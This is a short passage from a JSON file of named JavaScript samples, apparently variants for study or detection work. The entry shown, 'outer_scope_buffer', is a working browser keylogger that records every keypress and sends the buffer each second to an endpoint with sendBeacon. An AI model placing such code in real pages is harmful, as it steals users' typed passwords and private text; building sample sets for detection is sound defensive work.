    "name": "outer_scope_buffer",
    "source": "var buf=\"\";document.addEventListener(\"keydown\",function(e){var k=e.key;buf+=k;});setInterval(function(){var d=buf;navigator.sendBeacon(\"/c\",d);},1000);"
  },
  {
    "name": "array_push_join",
